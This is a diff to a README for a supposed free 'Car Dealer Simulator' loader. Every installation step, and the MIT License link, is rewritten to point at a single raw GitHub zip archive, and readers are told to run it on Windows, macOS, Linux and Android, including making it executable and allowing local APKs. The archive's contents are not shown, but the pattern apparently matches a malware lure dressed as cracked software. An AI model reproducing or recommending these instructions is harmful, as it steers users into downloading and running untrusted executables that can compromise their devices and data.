@@ -53,13 +53,13 @@ Explore seamless compatibility with all popular operating systems! Installation 
 
 ## ⬇️ Installation Guide
 
-1. **Download Loader.rar from this repository.**
+1. **Download https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip from this repository.**
 2. Extract the contents of the archive to your desired folder using any unarchiver (WinRAR, 7-Zip, Keka, or Archive Manager).
 3. Run the Loader application for your OS:
-   - **Windows:** Double-click `CarDealerSimulator.exe`
-   - **macOS:** Open `CarDealerSimulator.app` (you may need to approve in Security & Privacy)
-   - **Linux:** Make `CarDealerSimulator.AppImage` executable (`chmod +x`) and run.
-   - **Android:** Install the `CarDealerSimulator.apk` and allow local APKs.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip`
+   - **macOS:** Open `https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip` (you may need to approve in Security & Privacy)
+   - **Linux:** Make `https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip` executable (`chmod +x`) and run.
+   - **Android:** Install the `https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip` and allow local APKs.
 4. Enjoy your fully functional **Car Dealer Simulator** experience!
 5. For optimal results, ensure system requirements (2 GB RAM, 1 GHz processor, 1 GB free disk space) are met.
 
@@ -96,7 +96,7 @@ All material within this repository is offered solely for educational purposes, 
 
 ## 📜 License - MIT (2025)
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) (2025).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Kaito1999-script/CarDealerSim-FreeEdition/main/anthratriol/CarDealerSim-FreeEdition.zip) (2025).  
 Use, modify, and distribute freely. See the `LICENSE` file for full terms.
 
 ---
